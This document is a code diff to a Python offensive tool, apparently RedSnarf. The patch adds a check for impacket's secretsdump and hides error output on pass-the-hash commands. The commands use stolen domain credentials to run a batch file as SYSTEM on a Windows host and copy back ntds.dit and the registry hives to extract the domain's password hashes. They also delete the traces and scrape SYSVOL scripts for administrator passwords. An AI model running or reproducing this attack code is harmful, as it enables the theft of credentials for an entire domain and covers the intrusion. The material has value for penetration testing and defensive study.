@@ -392,6 +392,13 @@ if drsuapi in yesanswers:
 if ntds_util in yesanswers:
 	if targets.find('/')==-1:
 		try:
+			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
+				print colored("[-]No secretsdump.py",'red')
+				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
+				print colored("[-]and run: python setup.py install",'yellow')
+				exit(1)				
+			else:
+				print colored("[+]Found secretsdump",'green')
 			if not os.path.isdir(outputpath+targets):
 				os.makedirs(outputpath+targets)
 				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
@@ -404,11 +411,11 @@ if ntds_util in yesanswers:
 			fout.write(pscommand)
 			fout.close() 
 			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
-			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit'")
-			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit'")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" 2>/dev/null")
+			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit' 2>/dev/null")
+			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit' 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\" 2>/dev/null") 
 			if os.path.isfile(outputpath+targets+'/registry/SYSTEM') and os.path.isfile(outputpath+targets+'/Active Directory/ntds.dit'):	
 				print colored("[+]Found SYSTEM and ntds.dit",'green')
 				print colored("[+]Extracting Hash Database to "+outputpath+targets+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
@@ -453,9 +460,9 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 				print colored("[+]Found directory for : "+outputpath+targets,'green')
 			if os.path.isdir(outputpath+targets):
 				print colored("[+]Attempting to download policies folder from /sysvol",'green')		
-				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit'")
+				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
 				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
-				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit'")
+				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")
 				if os.path.isdir(outputpath+targets+'/scripts/'):
 					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/scripts/','green')	
 					os.chdir(outputpath+targets+'/scripts/')
